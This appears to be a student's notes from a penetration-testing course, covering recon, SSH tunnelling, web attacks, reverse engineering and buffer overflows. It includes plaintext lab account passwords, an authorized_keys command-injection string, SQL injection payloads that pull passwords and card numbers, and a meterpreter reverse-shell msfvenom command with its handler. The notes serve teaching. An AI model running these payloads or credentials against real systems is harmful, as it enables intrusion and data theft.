https://sec.cybbh.io/public/security/latest/index.html
CTF address (http://10.50.20.250:8000)
Occupational field resources
WIN-OPS - 10.50.43.194
LIN-OPS - 10.50.37.61
----
DarkNetDiaries - Podcast
Operation Glowing Symphony


-------------------
Username - CRWA-M-507
Password - qDRhLlXvXTqUjP5
IP - 10.50.37.139

Bonestroo - 10.50.26.30
Johannsen - 10.50.47.112
Bage - 10.50.40.200

Lewis
Username - GALE-M-507
Password - iv4CRgEPySw8bJM
IP - 10.50.44.245

##################################################################################
##################################################################################
#####                                                                        #####
#####                           Lesson Resources                             #####
#####                                                                        #####
##################################################################################
##################################################################################


Penetration Testing
---------------------
Report Example 1 - https://www.offsec.com/reports/sample-penetration-testing-report.pdf
Report Example 2 - https://tbgsecurity.com/wordpress/wp-content/uploads/2016/11/Sample-Penetration-Test-Report.pdf

Network Reconnaissance
--------------------
Nmap NSE - https://nmap.org/book/nse.html
Nmap NSE Scripts (Github) - https://github.com/nmap/nmap/tree/master/scripts
Scrapin gwith Python lxml - https://blog.datahut.co/beginners-guide-to-web-scraping-with-python-lxml/
Scraping with Python - https://docs.python-guide.org/scenarios/scrape/
Wireshark Display Filters - http://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf

Exploit Research
--------------------
Exploit Research Report Template - https://git.cybbh.space/sec/public/raw/master/security/activities/03-activity-exploit-pairing/Exploit_research-report-template.docx
Exploit-DB - https://www.exploit-db.com/

Web Exploitation
-------------------
W3schools SQL UNION - https://www.w3schools.com/sql/sql_union.asp
SQLbolt Practice - https://sqlbolt.com/
OWASP XSS Attacks - https://owasp.org/www-community/attacks/xss/
Amolnaik blog INSERT Injection - http://amolnaik4.blogspot.com/2012/02/sql-injection-in-insert-query.html
Pentestmonkey SQL cheat sheet - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
Netsparker SQL cheat sheet - https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
Mozilla Developer Console - https://developer.mozilla.org/en-US/docs/Tools/Browser_Console
Chrome Developer Console - https://developers.google.com/web/tools/chrome-devtools/console/
HTTP - https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol
AJAX Security - https://www.owasp.org/index.php/AJAX_Security_Cheat_Sheet
Cross-Site Scripting-PHP & Cookies - https://null-byte.wonderhowto.com/how-to/write-xss-cookie-stealer-javascript-steal-passwords-0180833/
Filter Evasion - https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
XSS Prevention - https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
XSS PreventionFile Upload Vulnerability - https://www.owasp.org/index.php/Unrestricted_File_Upload
Arbitrary File Upload - https://teambi0s.gitlab.io/bi0s-wiki/web/file-upload/
Command Injection - https://www.owasp.org/index.php/Command_Injection
PHP web shell introduction - https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/
Comprehensive tutorial on cross-site scripting - https://excess-xss.com/

Reverse Engineering
--------------------
Reverse Engineering Workflow - https://git.cybbh.space/sec/public/-/jobs/artifacts/master/raw/guides/Reverse_engineering_workflow.pdf?job=genpdf
x86 Student Guide - https://git.cybbh.space/sec/public/-/jobs/artifacts/master/raw/guides/x86_guide.pdf?job=genpdf
GDB Student Guide - http://10.50.20.250:8000/files/4590e117a1dc6559af667eaf509fb91c/GDB_student_guide.pdf
Ghidra Guide - http://10.50.20.250:8000/files/0c8520ac1e713e98f1881d73e5ac50a2/Ghidra_student_guide.pdf
IDA Overview - http://10.50.20.250:8000/files/619b9381e3d4fb1613a417f521a930ef/IDA_Overview.pdf
Memory Diagram - http://10.50.20.250:8000/files/8311b059c4dd857affccd47f6d89758a/memoryLayoutC.jpg
Registers Diagram - http://10.50.20.250:8000/files/fileimports/RegistersDiagram.pdf
Stack Practice - http://10.50.20.250:8000/files/fileimports/Stack_practice.pdf
Intel Manual - https://software.intel.com/sites/default/files/managed/39/c5/325462-sdm-vol-1-2abcd-3abcd.pdf
The Stack - https://eli.thegreenplace.net/2011/02/04/where-the-top-of-the-stack-is-on-x86/
OpenJDK11 - https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_windows-x64_bin.zip
Demo1.c - http://10.50.20.250:8000/files/5f7396c7ef355a19d99d94fbe178de04/demo_new.c
Demo1.exe - http://10.50.20.250:8000/files/d95014f62a0e81270f07cf170c70ddf7/demo1_new.exe
Demo2.c - http://10.50.20.250:8000/files/a5a8c6a38aaa65c7c76357311f32b470/demo2_new.c
Demo2.exe - http://10.50.20.250:8000/files/f93306b3b1e5fac8c8836536070d3ca5/demo2_new.exe
Demo3.c - http://10.50.20.250:8000/files/8781fd7d5b631217c4e35fbceee2ffae/demo10.c
Demo3.exe - http://10.50.20.250:8000/files/7d6cf3098d7230a69be668bf6674f24a/demo10.exe
Hmmm - http://10.50.20.250:8000/files/c5a854fe82abc7c56010cd12e090292d/Hmmm
Hmmm.exe - http://10.50.20.250:8000/files/adfe4af3511da055a4833ba05c304923/Hmmm.exe
HotCold - http://10.50.20.250:8000/files/948da94ea348a43cf44be4201a06dd33/HotCold

Exploit Development
---------------------
func demo - http://10.50.20.250:8000/files/b685b81a95c3eb3cf83f211416b63156/func
ASM Geometry - https://hovav.net/ucsd/dist/geometry.pdf
POC||GTFO - https://www.alchemistowl.org/pocorgtfo/
Phrack - http://www.phrack.org/
ROP FTW - https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf
Remote Buffer Overflor Methodology - http://10.50.20.250:8000/files/6698b44bd64f8c21874e4dd609952375/Remote_Overflow.py
Pattern_manager.py - http://10.50.20.250:8000/files/4df6b211b91f1aed2154b54bace0726d/patternmanager.py
Local Buffer OVerflow Methodology - http://10.50.20.250:8000/files/a0498670d52c5544f616cc14657c07e5/Local_Overflow.py
cibo - http://10.50.20.250:8000/files/42e8530f5fe6ccea3d077541682f28df/cibo
figureitout - http://10.50.20.250:8000/files/b14c5a9c825de98951160f491ea244ad/figureitout
build-exploit-linu-traditional.sh - http://10.50.20.250:8000/files/acb185c7b0c660916581ff768323ca4d/build-exploit-linux-traditional.sh
IamVulnerable.exe - http://10.50.20.250:8000/files/8b825a963e5422928c4c5fd666cde5c4/IamVulnerable.exe
libgcc_s_dw2-1.dll - http://10.50.20.250:8000/files/8ac3cfd1d1f536422b92942163a52448/libgcc_s_dw2-1.dll
Windows Buffer OVerflow - https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b

Post Exploitation
---------------------
Multiplexing - https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing
Tunneling - https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels
Explain Shell - https://explainshell.com/

Windows Specific Topics
---------------------
User vs. Kernel - https://en.wikibooks.org/wiki/Windows_Programming/User_Mode_vs_Kernel_Mode
Access Control Module - https://docs.microsoft.com/en-us/windows/desktop/secauthz/access-control-components
UAC Bypass - https://www.greyhathacker.net/?p=796
MITRE Persistence - https://attack.mitre.org/tactics/TA0003/
PowerSploit - https://github.com/PowerShellMafia/PowerSploit
UAC Information - https://blog.cobaltstrike.com/2014/03/20/user-account-control-what-penetration-testers-should-know/
Windows Security Log Events - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx
Windows DLL hijacking walkthrough - https://medium.com/techzap/dll-hijacking-part-1-basics-b6dfb8260cf1
Windows Putty.exe - http://10.50.20.250:8000/files/1fe32d79e64bfad384d8f6f4ae6cd5cf/putty.exe

Linux Specific Topics
--------------------
Linux Priv Esc Repo - https://gtfobins.github.io/
Rsyslog Wiki - https://wiki.gentoo.org/wiki/Rsyslog
Rsyslog Additional Help - https://www.the-art-of-web.com/system/rsyslog-config/

##################################################################################
##################################################################################
#####                                                                        #####
#####                           Lesson Resources                             #####
#####                                                                        #####
##################################################################################
##################################################################################

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 1    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Penetration Testing
-------------------
Phase 1 - Mission Definition
Employer will set up the guidelines for the mission (what is off limits and what is not, how to get to the objective if given the information)

Phase 2 - Recon
Passive Reconnaissance about the target (Google Dorking, tcpdump, nslookup)

Phase 3 - Footprinting
Gathering data about the target through scanning

Phase 4 - Exploitation and Initial Access

Phase 5 - Post-Exploitation
Establishing persistence (runkeys, accounts, services)
Escalate privileges (root, most times not root and using sudo instead)
Cover your tracks
Exfiltrate target data

Phase 6 - Document Mission
Document and report mission details

Penetration Test Reporting
------------------
Reasons to report - report when access is gained and when access is denied
What to report - report the good and bad, everything
Screen captures - describe screen captures

Scanning and Reconnaisance
-------------------
If a port is open verify the service
Using nmap and nc for banner grabbing

Open Source Intelligence
----
Appropriate Documentation Practices
Use of Collected Data
Collection Methods

Documentation
----
Why is it important?
What should we include in documentation?

Collection and Use
----
What do we want to collect?
How can it be used in operations?

Limitations on Collection
----
Are there rules that guide our operations and collection parameters?
What are important factors when collection data about a target?

Data to Collect
----
Web Data
  Cached Content, Analytics, Proxy Web Application, Command Line Interrogation
Sensitive Data
  Business Data, Profiles, Non-Profits/Charities, Business Filings, Hostorical and Public Listings
Publicly Accessible
  Physical Addresses, Phone Numbers, Email Addresses, User Names, Search Engine Data, Web and Traffic Cameras, Wireless Access Point Data
Social Media
  Twitter, Facebook, Instagram, People Searches, Registry and Wish Lists
Domain and IP Data
  DNS Registration, IP Address Assignments, Geolocation Data, Whois

Hyper-Text Markup Language (HTML)
----
Standardized markup language for browser interpretation of webpages
  Client-side interpretation (web browser)
  Utilizes elements (identified by tags)
  Typically redirects to another page for server-side interaction
  Cascading Sytlesheets (CSS) for page themeing

DOCTYPE declares what type of document

Scraping
----
Data prep
(pip install lxml requests)

#!/usr/bin/python
import lxml.html
import requests
                            ##Webpage
page = requests.get('http://quotes.toscrape.com') ##<- webpage goes here ->
tree = lxml.html.fromstring(page.content)      ##Library for processing SML and HTML in the Python language

authors = tree.xpath('//small[@class="author"]/text()')    ## Xpath Query filter for Small Tags, where class is authors

print ('Authors: ',authors)

Advanced Scanning techniques
-----------------------
Host Discovery
  Find hosts that are online
Port Enumeration
  Find ports for each host that is online
Port Interrogation
  Find what service is running on each open/available port

Host discovery methods
----
Ping sweep, nmap

Port Enumeration
----
nc or nmap

Port Interrogation
----
nc or nmap

nikto -h <IP> -p <port>

NMAP Scripting Engine
-------------------
Benefits of scanning with scripts
Script management and Utilization
Usage and Examples

/usr/share/nmap/scripts

Good scripts for class
----
banner.nse
http-enum.nse

nmap --script=http.enum.nse <IP>

Main benefits
----
Network discovery
Sophisticated Version Detection
Vulnerability Detection
Backdoor detection
Vulnerability Exploitation

Master Sockets
------------------
ssh -MS /tmp/<filename> student@<IP> -O cancel (-M master -S socket/slave)

ssh -S /tmp/<same file> <random words> -O forward -L<RHP>:<IP>:22

ssh student@127.0.0.1 -p 2222

ssh -S /tmp/<file> <random text> -O forward -D9050

1. ssh -MS /tmp/<file> student@<initial jump>
2. ssh -S /tmp/<file> <random text> -O forward -L2222:<IP>:22 -L2223:<additional IP>:<port> -L2224:<additional IP>:<port> (can set up all tunnels in one command)
3. ssh -MS /tmp/<target file> <username>@127.0.0.1 -p 2222(travels through the first Master Socket through the socket to the next box creating a master socket on the next box)
4. ssh -S /tmp/<target file> <random text> -O forward -D9050 (proxychains will now work on the second hop, the final target computer)

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 2    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Exploitation and Vulnerability Research
---------------------
Vulnerability Research
----
Offensive
--
Used to find known exploits so that you dont have to come up with your own exploit for something that has already been exploited

Defensive
--
Used to defend your network from exploits that are known

When researching vulnerabilities, make sure that a reputable website/source is being used for the research

Initial access
----
The first time a system is accessed and how it was accessed

Web Exploitation
-----------------
HTTP Response Codes
----
10X==Informational
2XX==Success
30X==Redirection
4XX==Client Error
5XX==Server Error

Enumeration
----
Legitimate surfing
Tools:
  NSE Scripts
  Nikto
  Burp suite (outside of class)

--script=http-enum.nse

Robots.txt will tell what pages are available to you and which are not accessible

ROBOTS.TXT WILL HELP WITH TEST

Cross-Site Scripting(XSS)
----
For Cross-Site Scripting you need a secure server that will send a false request back to the client

Reflected XSS
----
Most common form
Trasnient, occurs in error messages or search results
Delivered through intermediate media, such as a link in an email
Characters that are normally illegal in URLs can be Base64 encoded

Stored XSS
----
Resides on vulnerable site
Only requires user to visit page

Useful JavaScript Components
----
Proof of concept
Capturing cookies
Capturing keystrokes
Capturing sensitive data

/var/www/html

Command injection
----
can use search boxes on server sites to run commands that the server should not allow you to run

Generating and uploading a public ssh key
----
ls -la /var/www
mkdir /var/www/.ssh (if .ssh does not exist on server)
rm -rf .ssh (remove ssh keys to generate a new one)
ssh-keygen -t rsa -b 4096 (generates ssh key)
id_rsa = private key
id_rsa.pub = public key
cat id_rsa.pub 
GRAB ALL OF THE TEXT AND ADD IT TO A NEW FILE 
; echo "<text>" > /var/www/.ssh/authorized_keys
(copy and paste into box on server to gain access)
Verification
--
cat /var/www/.ssh/authorized_keys
ssh -i id_rsa <username>@<IP> of server that just added workstation to the server

10.100.28.40 potential password - YourTempPassword

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 3    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

SQL Injection
----
database - repository that holds information, similar to an excel document

Structured Query Language - ANSI Standard

Standard Commands
----
SELECT    Extracts data from a database
UNION    Used to combine the result-set of two or more SELECT statements
USE    Selects the DB to use
UPDATE    Updates data in a database
DELETE    Deletes data from a database
INSERT INTO    Inserts new data into a database
CREATE DATABASE    Creates a new database
ALTER DATABASE    Modifies a database
CREATE TABLE    Creates a new table
ALTER TABLE    Modifies a table
DROP TABLE    Deletes a table
CREATE INDEX    Creates an index (search key)
DROP INDEX    Deletes an index

End commands with a ;
Examples commands
----
SHOW tables;
SHOW TABLES FROM session; (session is database)
SHOW COLUMNS FROM session.Tires; (Tires is table inside database)
SELECT tireid,name,size,cost FROM session.Tires (output is put into the order set up in the command)
***************SELECT column,column,column FROM Database.Table;***************
SELECT color,year,name FROM session.car UNION SELECT name,size,cost FROM session.Tires (puts the information from both tables and adds them into the same table)
UNION must have the same amount of columns selected in order for the commands to work
Can use any number to populate empty columns that are needed to properly run the command

SQL Injection
----
Requires Valid SQL Queries
Fully patched systems can be vulnerable due to misconfiguration
Input Field Sanitization
String vs Integer Values
Is INFORMATION_SCHEMA Database available?
GET Request versus POST Request HTTP methods (Results may vary when using GET compared to POST)

INFORMATION_SCHEMA has information about all of the databases

Unsanitized vs sanitized
----
Unsanitized is not checked for potentially harmful information
Sanitized is checked



##################################################################################
##################################################################################
#####                                                                        #####
#####          Finding Usernames and Passwords using SQL Injection           #####
#####                                                                        #####
##################################################################################
##################################################################################


select id from users where name = '$name' and pass = '$pass'
select id from users where name = 'tom' or 1='1' and pass = 'tom' or 1='1';
when the server doesnt know how to handle the information that it was given when it was not supposed to work it dumps all of the IDs on the system

POST Method
----
Audi' UNION 1,2,3,4,5 ;#
Audi' UNION select table_schema,2,table_name,column_name,5 from information_schema.columns ;# (decide placeholders based on output of the original correct POST request command)
table_schema = databases
table_name = tables
column_name = columns

Audi' UNION select id,2,name,pass,5 from session.user ;#

GET Method
----
http://10.50.35.75/uniondemo.php?Selection=2 or 1=1#
http://10.50.35.75/uniondemo.php?Selection=2 UNION select 1,3,2#
http://10.50.35.75/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns#
http://10.50.35.75/uniondemo.php?Selection=2 UNION select id,pass,name from session.user#
http://10.50.35.75/uniondemo.php?Selection=2 UNION select cost,year,color from session.car UNION select type,carid,name from session.car#
http://10.50.35.75/uniondemo.php?Selection=2 UNION select 1,3,@@version# (shows the version of the SQL server)



##################################################################################
##################################################################################
#####                                                                        #####
#####          Finding Usernames and Passwords using SQL Injection           #####
#####                                                                        #####
##################################################################################
##################################################################################

CTF Examples
----
http://127.0.0.1:1870/cases/productsCategory.php?category=13
http://127.0.0.1:1870/cases/productsCategory.php?category=1 UNION select creditcard_number,2,3 from sqlinjection.payments#
http://127.0.0.1:1870/cases/productsCategory.php?category=1 UNION select username,password,permission from sqlinjection.members#

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 4    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Reverse Engineering
----------------------
%rax    the first return register

%rbp    the base pointer that keeps track of the base of the stack

%rsp    the stack pointer that points to the top of the stack

[%ebp-0x8] = 16 bit base pointer

HEAP - Memory that can be allocated and deallocated
STACK - A contiguous section of memory used for passing arguments
GENERAL REGISTER - A multipurpose register that can be used by either programmer or user to store data or a memory location address
CONTROL REGISTER - A processor register that changes or controls the behavior of a CPU
FLAGS REGISTER - Contains the current state of the processor

LEA = MOV
MOV - move
PUSH - push
POP - pop the top
CMP - compare
JMP- jump
JLE - jump if less than or equal
JE - Jump if equal
JNZ - jump if not zero

Malware Analysis Software
-------------------------
Static - strings
Behavorial - launch the malware
Dynamic - gdb
Disassembly - ghidra
Document Findings - make a document of what you have done

Patching/Software Analysis
--------------------------
Chainging the assembly instructions to do what you want

Param_1 in Ghidra almost always means that it is user input

Patching
---------------------------
Making the program say success no matter what

^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^     Part 2   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 5    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Exploit Development
---------------------------------
Buffer Overflow
----
IP - instruction pointer contains the address of next instruction
EIP - 32-bit instruction pointer
Stack Pointer - next available space on the stack
Base Pointer - base of the stack
Shellcode - code written in byte format to ideally get a shell

Defending Buffer Overflow
-----------
Non executable stack (NX)
Address Space Layout Randomization (ASLR) - randomizes stack pointers and all addresses to prevent overflowing
Data Execution Prevention (DEP) - read only and write only code will never execute
Stack Canaries - there are bytes of data somewhere on the stack and if the canary is no longer in the stack because it has been overwritten then the program will not execute
Position Independent Executable (PIE) - 

Stack Canaries and ASLR are only needed for class (Stack canaries is only for the bonus question)

Tools
----
IDA, GHIDRA
GDB, MONA, IMMUNITY
BASH, PYTHON

Buffer overflow - GDB

10.50.20.250:8000

2 ways of input in bash
----
User input (hangs on the screen)
Parameter

to overflow a user input feed a lot of information



LINUX BUFFER OVERFLOW
------------------------
Getting a valid memory space for code to execute
----
after verifying control of the eip
!!!load environmentless gdb - (env - gdb)
!!!show env
!!!unset all envs
run program and manually overflow
once a SIGSEGV is achieved then continue
!!!info proc map
search inside the heap for valid addresses
jumpesp - jump to the next available portion of the stack
!!!find /b <start address under the heap>,<end address before stack>,0xff,0xe4 (opcodes for jumpesp)
the results are the IPs, grab a few to use for the buffer overflow
endianess needs to be reversed, OS and Python use opposite endians
reverse byte order (easiest way is \x43\x53\xf6\xf7 [0xf7f65343])
create shellcode
!!!msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python (the only section that will change is the CMD section)
nop = "\x90" * 15 (added before the buf in the script)
print all of the script
if it works then you should see the command that you ran
!!!which gdb
if there is a gdb then you will have to run a buffer overflow on that machine
in order to do it on the machine you are targeting you will have to find the EIPs on the target machine


((((((((((LINUX/X86/EXEC))))))))))



run
info proc map
find /b <start address under the heap>,<end address before stack>,0xff,0xe4
msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python
./<file> <<< $(python <script>)

WINDOWS BUFFER OVERFLOW
--------------------------
!mona jmp -r ESP -m "essfunc.dll"
625012a0

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.37.61 LPORT=7777 -b "\x00" -f python
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 7777


